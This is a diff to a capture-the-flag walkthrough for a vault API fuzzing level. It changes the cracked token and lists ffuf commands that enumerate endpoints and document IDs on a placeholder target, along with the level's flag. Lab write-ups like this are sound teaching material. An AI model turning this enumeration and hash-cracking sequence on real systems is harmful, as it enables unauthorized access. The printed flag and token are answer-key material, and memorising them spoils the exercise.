@@ -83,17 +83,17 @@ Response returns the flag and `vault_svc`'s SHA256 hash.
 ## Level 6 — Vault API fuzzing (ffuf)
 
 **Flag:** `NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}`
-**Token:** `V4ult_M4st3r_K3y!` (crack vault_svc SHA256 from Level 5 with rockyou.txt).
+**Token:** `dragon` (crack vault_svc SHA256 from Level 5 with rockyou.txt).
 
 ```bash
 # Phase 1 — discover endpoints
 wget http://TARGET:5000/level/6/api-wordlist.txt -O api-wordlist.txt
-ffuf -w api-wordlist.txt -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
+ffuf -w api-wordlist.txt -H "X-Vault-Token: dragon" \
   -u "http://TARGET:5000/level/6/vault-api/FUZZ" -fc 404
 
 # Phase 2 — fuzz doc_id
 seq 1 95 > nums.txt
-ffuf -w nums.txt -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
+ffuf -w nums.txt -H "X-Vault-Token: dragon" \
   -u "http://TARGET:5000/level/6/vault-api/archives?doc_id=FUZZ" -fw 7
 ```
 
